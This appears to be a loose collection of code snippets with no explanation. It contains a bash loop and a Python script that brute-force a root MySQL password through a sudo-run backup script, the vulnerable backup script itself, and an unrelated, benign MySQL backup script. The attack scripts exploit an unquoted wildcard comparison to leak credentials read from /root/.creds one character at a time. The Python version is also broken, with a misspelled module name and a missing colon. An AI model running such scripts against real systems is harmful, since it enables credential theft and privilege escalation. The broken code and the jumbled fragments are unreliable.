##
##```

password=""

while true; do
    password_check=$(echo "$password" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)

    if [ $password_check -gt 2 ]
    then
        echo "$password"
        break
    fi

    for char in {a..z} {A..Z} {0..9}; do
        result_number_of_lines=$(echo "$password$char*" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)

        if [ $result_number_of_lines -gt 2 ]
        then
            password="$password$char"
            continue
        fi
    done
done
```
##
##

#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

##
##

import string
import subproccess

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)
	return "Password confirmed!" in result.stdout

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char)
			password += char
			print(password)
			break
	else:
		is_password_found = True



#!/bin/bash
## Author: Jeff Higham <jeff@f3code.com>, <jeffhigham@gmail.com>
## Gist: https://gist.github.com/jeffhigham-f3/3b94d508269e614f1f2e701ada8239cc 
##
## Usage: mysqlbackup
##

## BEGIN EDITING

# timestamp for backups
NOW=$(date +'%Y-%m-%d_%H:%M:%S')

# databases to backup seperated by a space or comma
DATABASES='mydatabase'

# database user
USER='root'

# database password
PASSWORD=''

# database host
HOST='localhost'

# directory to store backups.
BACKUPDIR='./'
BACKUPDIR_TABLES='./tables'

# days to retain backups
RETAIN=30

## END EDITING

test -d $BACKUPDIR || mkdir -p $BACKUPDIR
test -d $BACKUPDIR_TABLES || mkdir -p $BACKUPDIR_TABLES

if ! command -v mysql &>/dev/null 2>&1; then
    echo "mysql command not found. Please install the mysql. "
    exit
fi

if ! command -v mysqldump &>/dev/null 2>&1; then
    echo "mysqldump command not found. Please install the mysqldump. "
    exit
fi

if ! command -v gzip &>/dev/null 2>&1; then
    echo "gzip command not found. Please install gzip."
    exit
fi

for DB in $(echo $DATABASES | sed -e 's/,/ /g'); do

    echo
    echo -n "Backing up database: $DB to ${BACKUPDIR}/${DB}-$NOW.sql.gz ... "
    mysqldump --user=$USER --password=$PASSWORD --default-character-set=utf8 --single-transaction --host=$HOST $DB 2>/dev/null | gzip -c >$BACKUPDIR/$DB-$NOW.sql.gz
    echo "done!"

    table_count=0

    for table in $(mysql -NBA --user=$USER --password=$PASSWORD --host=$HOST -D $DB -e 'show tables' 2>/dev/null); do
        echo -n "DUMPING TABLE: $DB.$table to $BACKUPDIR_TABLES/$DB.$table-$NOW.sql.gz ... "
        mysqldump --user=$USER --password=$PASSWORD --default-character-set=utf8 --single-transaction --host=$HOST $DB $table 2>/dev/null | gzip -c >$BACKUPDIR_TABLES/$DB.$table-$NOW.sql.gz
        table_count=$((table_count + 1))
        echo "done!"
    done

    echo "$table_count tables dumped from database '$DB' into dir=$BACKUPDIR_TABLES/"
    echo

done

echo -n "Removing backups older than $RETAIN days ... "
find $BACKUPDIR -type f -name '*.sql.gz' -mtime +${RETAIN} -exec rm {} \;
echo "done!"
